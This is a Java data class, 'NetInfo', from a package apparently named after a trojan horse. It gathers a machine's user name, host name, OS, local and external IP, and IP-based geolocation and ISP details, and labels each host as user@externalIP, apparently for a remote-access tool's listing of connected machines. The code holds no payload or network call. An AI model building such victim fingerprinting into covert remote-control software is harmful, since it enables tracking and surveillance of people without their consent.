package greek.horse.models;

import org.apache.commons.lang3.SystemUtils;

import javax.json.JsonObject;
import java.io.IOException;
import java.io.Serializable;
import java.net.InetAddress;

public class NetInfo implements Serializable {
    private final String userName;
    private final OS os;
    private final String bigOs;
    private final String hostName;
    private final String localIP;
    private final String externalIP;

    private final String country;
    private final String region;
    private final String city;
    private final String timeZone;

    private final String isp;
    private final String org;
    private final String as;
    private final boolean headless;


    public NetInfo(String userName, OS os, String bigOs, String hostName, String localIP, String externalIP, String country, String region, String city, String timeZone, String isp, String org, String as, boolean headless) {
        this.userName = userName;
        this.os = os;
        this.bigOs = bigOs;
        this.hostName = hostName;
        this.localIP = localIP;
        this.externalIP = externalIP;
        this.country = country;
        this.region = region;
        this.city = city;
        this.timeZone = timeZone;
        this.isp = isp;
        this.org = org;
        this.as = as;
        this.headless = headless;
    }

    public NetInfo(InetAddress inet, JsonObject json, boolean headless) throws IOException {

        if (!json.getString("status").contains("success")){
            throw new IOException("Status returner false: "+json.getString("status"));
        }


        if (SystemUtils.IS_OS_MAC){
            os = OS.MAC;
        } else if (SystemUtils.IS_OS_UNIX){
            os = OS.UNIX;
        } else if (SystemUtils.IS_OS_WINDOWS){
            os = OS.WINDOWS;
        } else {
            os = OS.UNKNOWN;
        }

        this.headless = headless;
        this.bigOs = System.getProperty("os.name");

        this.userName = SystemUtils.getUserName();
        this.hostName = SystemUtils.getHostName();
        this.localIP = inet.getHostAddress();
        this.externalIP = json.getString("query");

        this.country = json.getString("country");
        this.region = json.getString("regionName");
        this.city = json.getString("city");
        this.timeZone = json.getString("timezone");

        this.isp = json.getString("isp");
        this.org = json.getString("org");
        this.as = json.getString("as");
    }

    @Override
    public String toString() {
        return "NetInfo{" +
                "userName='" + userName + '\'' +
                ", os=" + os +
                ", bigOs='" + bigOs + '\'' +
                ", hostName='" + hostName + '\'' +
                ", localIP='" + localIP + '\'' +
                ", externalIP='" + externalIP + '\'' +
                ", country='" + country + '\'' +
                ", region='" + region + '\'' +
                ", city='" + city + '\'' +
                ", timeZone='" + timeZone + '\'' +
                ", isp='" + isp + '\'' +
                ", org='" + org + '\'' +
                ", as='" + as + '\'' +
                '}';
    }

    public String getUserName() {
        return userName;
    }

    public OS getOs() {
        return os;
    }

    public String getHostName() {
        return hostName;
    }

    public String getLocalIP() {
        return localIP;
    }

    public String getExternalIP() {
        return externalIP;
    }

    public String getCountry() {
        return country;
    }

    public String getRegion() {
        return region;
    }

    public String getCity() {
        return city;
    }

    public String getTimeZone() {
        return timeZone;
    }

    public String getIsp() {
        return isp;
    }

    public String getOrg() {
        return org;
    }

    public String getAs() {
        return as;
    }

    public String getBigOs() {
        return bigOs;
    }

    public boolean isHeadless() {
        return headless;
    }

    public String getTitle(){
        return this.userName+"@"+this.externalIP;
    }
}
